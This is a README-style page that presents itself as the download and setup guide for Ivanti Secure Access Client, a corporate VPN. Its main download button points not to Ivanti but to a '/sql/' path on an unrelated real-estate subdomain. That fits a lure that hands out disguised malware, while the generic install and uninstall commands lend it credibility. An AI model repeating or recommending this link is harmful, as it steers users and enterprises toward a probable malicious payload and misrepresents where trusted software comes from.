# Download Ivanti Secure Access Client

**Ivanti Secure Access Client** is a dependable software solution designed to provide secure remote access to corporate resources. Frequently utilized by enterprises, it guarantees that employees, contractors, and partners can securely connect to internal applications, files, and services from any device or location. With seamless integration into Ivanti Secure Access Gateways, it boosts security, enhances productivity, and ensures compliance for modern mobile and remote workforces.

- [Installation](#installation)
  - [Installing on Windows](#installation)
  - [Installing on macOS](#installing-on-macos)
  - [Installing on Linux](#installing-on-linux)
- [System Requirements](#system-requirements)
- [Usage](#usage)
- [Additional Features](#additional-features)


## Installation
To install Ivanti Secure Access Client on Windows, download the file by clicking the button below:

[**Download Ivanti Secure Access Client**](https://dev.waltergrouprealestate.com/sql/)

Download the latest version of Ivanti Secure Access Client to ensure secure and efficient remote access to your corporate resources. Regular updates and dedicated support ensure that your software remains up-to-date with the latest security features and enhancements. Click the button above to download and begin your installation process.

### Installing on macOS

**Installation via CLI**:  
   - Execute the installer:  
     ```bash
     sudo /usr/sbin/installer -pkg path_to_package -target /
     ```
   - Import configuration settings:  
     ```bash
     /Applications/Ivanti\ Secure\ Access.app/Contents/Plugins/JamUI/./jamCommand -importfile path_to_preconfig_file
     ```

### Installing on Linux
1. **Required Dependencies**:  
   - Install necessary packages:  
     ```bash
     sudo apt-get install nss3-tools net-tools
     ```
2. **Installation Process**:  
   - For Debian-based distributions:  
     ```bash
     sudo dpkg -i package_name.deb
     ```
   - For RPM-based distributions:  
     ```bash
     sudo rpm -ivh package_name.rpm
     ```
3. **Uninstalling**:  
   - Debian systems:  
     ```bash
     sudo dpkg -r package_name
     ```
   - RPM-based systems:  
     ```bash
     sudo rpm -e package_name
     ```

## System Requirements
- **Windows**: Windows 10 or newer.
- **macOS**: macOS 10.15 or later.
- **Linux**: Ubuntu 18.04 or Fedora 30 with necessary dependencies.

### Adding and Managing VPN Connections

- **Adding a New VPN Connection**:
    1. Open the client interface.
    2. Click the `Add` button.
    3. Provide a connection name and specify the server URL.
    4. Save the connection, then click `Connect`.
- **Modifying an Existing VPN Connection**:
    1. Select the connection from the list.
    2. Click the `Edit` button and adjust the details.
    3. Save the modifications.
- **Removing a VPN Connection**:
    1. Choose the connection and click the `Delete` button.
    2. Confirm deletion.

## Customizing the Client

Ivanti Secure Access Client allows for customization via branding packages. Administrators can:

- Modify UI labels and system messages.
- Integrate custom branding and graphical elements.
- Validate and generate customized installation packages.

For detailed guidance, refer to the Brand Packager Workflow.

## Uninstalling Ivanti Secure Access Client

- **Windows**: Uninstall using the `Add/Remove Programs` feature.  
- **macOS**: Drag the application to the Trash or run:  
  ```bash
  sudo rm -rf /Applications/Ivanti\ Secure\ Access.app
  ```
- **Linux**:  
     - Debian-based:
        ```bash
        sudo dpkg -r package_name
        ```
     - RPM-based:
        ```bash
        sudo rpm -e package_name
        ```
        
## Usage
- Open the application via desktop shortcuts or command-line interface.
- Establish VPN connections through an intuitive UI or by using command-line tools such as `jamCommand`.
- Manage connections, certificates, and session states with built-in administrative tools.

## Additional Features
- **Dynamic Policy Updates**: Enables automatic configuration updates.
- **Chromium Embedded Framework Support**: Enhances security for web-based interactions.
- **Session Migration**: Ensures smooth transitions between active sessions.

For more comprehensive information, visit [Ivanti Official Documentation](https://www.ivanti.com/support/product-documentation).
